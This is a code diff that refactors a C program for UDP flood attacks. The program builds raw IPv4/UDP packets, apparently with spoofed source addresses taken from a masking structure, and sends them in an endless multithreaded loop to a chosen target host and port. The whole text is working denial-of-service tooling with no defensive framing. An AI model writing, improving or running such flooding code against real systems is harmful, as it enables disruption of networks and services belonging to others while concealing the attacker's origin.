@@ -35,14 +35,13 @@ void UdpFloodPrintUsage(void)
 
 void *GenerateUdpFlood(void *data)
 {
-    int thread_id = *((int *)data);
     int sock = MakeRawSocket(IPPROTO_UDP);
 
     int udp_size = 1024;
 
     if(g_packet_size < 1024)
         udp_size = g_packet_size;
-    char udp_data[udp_size];
+    char udp_data[BUFFER_SIZE];
 
     int i;
     for (i = 0; i < udp_size; ++i) {
@@ -53,12 +52,19 @@ void *GenerateUdpFlood(void *data)
     char udp_buf[sizeof(struct udphdr)] = {0, };
     struct udphdr *udp_h_ptr = (struct udphdr *)udp_buf;
     udp_h_ptr->data = (char *)malloc(sizeof(char) * udp_size);
+    memcpy(udp_h_ptr->data, udp_data, udp_size);
     udp_h_ptr->checksum = 0;
     udp_h_ptr->src_port = htons(0);
     udp_h_ptr->len = htons(udp_size);
 
     MaskingArguments udp_now;
 
+    struct iphdr ipv4_h;
+    PrepareEmptyIphdr(&ipv4_h);
+    ipv4_h.protocol = (IPPROTO_UDP);
+    ipv4_h.tot_len += sizeof(struct udphdr) + udp_size;
+
+    char packet[BUFFER_SIZE];
     while (1) {
         // *** begin of critical section ***
         pthread_mutex_lock(&g_udp_mutex);
@@ -79,12 +85,8 @@ void *GenerateUdpFlood(void *data)
         pthread_mutex_unlock(&g_udp_mutex);
 
         // make ipv4 header
-        struct iphdr ipv4_h;
-        ipv4_h = PrepareEmptyIphdr();
-        ipv4_h.protocol = (IPPROTO_UDP);
         ipv4_h.saddr = inet_addr(udp_now.src);
         ipv4_h.daddr = inet_addr(udp_now.dest);
-        ipv4_h.tot_len += sizeof(struct udphdr)+udp_size;
         ipv4_h.check = IphdrGetChecksum((uint16_t *) &ipv4_h,
                 sizeof(struct udphdr) + sizeof(struct icmp));
 
@@ -92,12 +94,9 @@ void *GenerateUdpFlood(void *data)
         udp_h_ptr->dest_port = htons(udp_now.port);
         
         // make and send packet
-        char *packet = AssembleIphdrWithData(ipv4_h,
-                udp_h_ptr,
-                sizeof(struct udphdr) + udp_size);
-
-        SendPacket(sock, ipv4_h, packet, udp_now.port);
-        free(packet);
+        memset(packet, 0x00, sizeof(packet));
+        AssembleIphdrWithData(packet, &ipv4_h, udp_h_ptr, sizeof(struct udphdr) + udp_size);
+        SendPacket(sock, packet, ipv4_h.daddr, ipv4_h.tot_len, udp_now.port);
     }
     close(sock);
     return NULL;
@@ -157,7 +156,7 @@ void UdpFloodMain(char *argv[])
         printf("thread %d joined\n", i);
     }
     pthread_mutex_destroy(&g_udp_mutex);
-    printf("UDP Flooding finished\nTotal %lu packets sent.\n",
+    printf("UDP Flooding finished\nTotal %u packets sent.\n",
             g_udp_num_total);
     pthread_exit(NULL);
     return;
